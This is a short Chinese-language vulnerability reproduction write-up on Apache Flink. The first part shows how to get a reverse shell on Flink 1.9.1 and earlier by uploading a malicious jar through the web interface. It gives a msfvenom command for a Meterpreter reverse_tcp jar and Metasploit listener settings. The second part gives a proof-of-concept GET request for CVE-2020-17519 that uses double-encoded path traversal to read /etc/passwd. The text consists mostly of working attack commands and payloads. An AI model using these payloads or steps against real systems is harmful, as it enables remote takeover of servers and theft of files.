Apache Flink 后台上传jar包反弹shell


简介：

Apache Flink是由Apache软件基金会开发的开源流处理框架，其核心是用Java和Scala编写的分布式流数据流引擎。Flink以数据并行和流水线方式执行任意流数据程序，Flink的流水线运行时系统可以执行批处理和流处理程序。

 

01 描述

通过部署任意jar包的功能可直接向服务器添加jar木马文件


02 影响范围

<= 1.9.1


漏洞复现：


漏洞环境下载地址：

http://archive.apache.org/dist/flink/flink-1.9.1/flink-1.9.1-bin-scala_2.11.tgz


在后台点击 AaddNew  上传反弹shell 恶意jar包



msf生成的恶意jar 语句：

msfvenom ‐p java/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=8087 ‐f jar > rce.jar



公网msf 监听端口

use exploit/multi/handler
set lhost 0.0.0.0
set lport 8087
set payload java/meterpreter/reverse_tcp


运行恶意包




成功反弹shell



Apache Flink漏洞  CVE-2020-17519 jobmanager/logs路径遍历



漏洞描述：

Apache Flink1.11.0中引入的一个更改(也在1.11.1和1.11.2中发布)允许攻击者通过JobManager进程的REST接口读取JobManager本地文件系统上的任何文件。


影响版本：

1.11.0、1.11.1、1.11.2


漏洞复现：


GET请求POC：

/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..
%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd
